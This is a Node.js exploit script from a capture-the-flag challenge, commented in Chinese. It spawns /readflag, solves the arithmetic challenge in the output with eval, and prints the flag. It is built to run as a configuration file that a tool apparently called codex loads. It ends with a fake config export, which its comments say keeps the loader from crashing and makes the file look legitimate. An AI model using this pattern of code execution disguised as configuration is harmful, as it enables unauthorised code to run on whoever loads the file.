const { spawn } = require('child_process');

console.log("==============[ CTF ATTACK START ]==============");

try {
    // 启动 readflag 程序
    const p = spawn('/readflag');
    let outputBuffer = '';
    let hasSolved = false;

    // 监听标准输出
    p.stdout.on('data', (data) => {
        const chunk = data.toString();
        outputBuffer += chunk;

        // 如果还没解决，尝试寻找算式
        if (!hasSolved) {
            // 按行分割，寻找包含括号和数字的算式行
            const lines = chunk.split('\n');
            for (const line of lines) {
                const expr = line.trim();
                // 简单的特征匹配：以 (( 开头，以 )) 结尾
                if (expr.startsWith('((') && expr.includes(')')) {
                    console.log(`[+] Found Expression: ${expr}`);
                    try {
                        // JS 的 eval 可以直接计算这种标准数学表达式
                        const answer = eval(expr); 
                        console.log(`[+] Calculated Answer: ${answer}`);
                        
                        // 迅速写入答案
                        p.stdin.write(answer + '\n');
                        hasSolved = true;
                    } catch (e) {
                        console.log(`[-] Eval error: ${e.message}`);
                    }
                }
            }
        }
    });

    p.stderr.on('data', (data) => {
        console.log(`STDERR: ${data.toString()}`);
    });

    p.on('close', (code) => {
        console.log(`[+] Process exited with code: ${code}`);
        console.log("==============[ FINAL OUTPUT ]==============");
        // 程序结束后打印完整的 buffer，Flag 应该就在里面
        console.log(outputBuffer);
        console.log("============================================");
    });

} catch (err) {
    console.error("Exploit execution failed:", err);
}

// 必须导出一个对象，否则 codex 加载配置时可能会崩溃
module.exports = {
    // 这里的配置甚至可以模拟成合法的，以降低报错概率
    language: 'python' 
};
